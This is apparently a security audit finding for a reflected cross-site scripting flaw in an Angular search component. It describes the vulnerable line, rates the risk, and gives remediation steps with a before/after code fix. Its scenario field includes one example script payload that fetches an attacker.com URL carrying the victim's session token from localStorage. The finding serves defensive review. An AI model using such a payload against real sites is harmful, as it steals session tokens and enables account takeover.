  title: Cross-Site Scripting — search-result.component.ts:143
  affected_parameter: q
  scenario: In `SearchResultComponent.filterTable()` at line 143, the URL query parameter `?q=` is read from `this.route.snapshot.queryParams.q`,
    trimmed, then passed directly to `this.sanitizer.bypassSecurityTrustHtml(queryParam)` and assigned to `this.searchValue`
    which is bound as `[innerHTML]` in the template. Angular's default sanitizer is explicitly disabled for this binding.
    Any HTML or script payload in `?q=` renders unmodified in the DOM. An attacker sends a victim a crafted link such as `/#/search?q=<script>fetch('https://attacker.com?t='+localStorage.getItem('token'))</script>`.
    Because the JWT is in `localStorage`, this converts any reflected-XSS opportunity into an immediate account takeover.
  evidence_summary: '`filterTable()` at `search-result.component.ts:143` calls `this.sanitizer.bypassSecurityTrustHtml(queryParam)`
    with unvalidated `req.queryParams.q`.'
  impact_description: Attacker who induces a victim to click a crafted URL can steal the session JWT from localStorage, achieving
    full account takeover.
  likelihood: High
  impact: Critical
  risk: Critical
  controls_in_place: Angular default sanitizer is present for other bindings but explicitly bypassed at this line.
  mitigation_title: Remove bypassSecurityTrustHtml call for search query and render search term as text-only in search-result.component.ts
  remediation:
    effort: Low
    steps:
    - Replace `this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam)` at line 143 with `this.searchValue =
      queryParam` and change the template binding from `[innerHTML]` to `{{ searchValue }}` (text interpolation), which Angular
      auto-escapes.
    - 'If highlighted-match rendering requires HTML, use a server-side allowlist approach: generate the highlighted HTML server-side
      where the allowlist is strictly `<mark>`, `<b>`, or similar non-scriptable elements, and validate the output against
      the same allowlist before sending to the client.'
    - Remove `sanitize-html@1.4.2` (known XSS bypass in v1 series) or upgrade to `sanitize-html@^2.13` and restrict the allowed
      tags/attributes to the minimal set needed.
    code_example: '// BEFORE (vulnerable)

      this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam)


      // AFTER (safe — render as text, no HTML injection)

      this.searchValue = queryParam  // template uses {{ searchValue }}, not [innerHTML]'
    reference: CWE-79
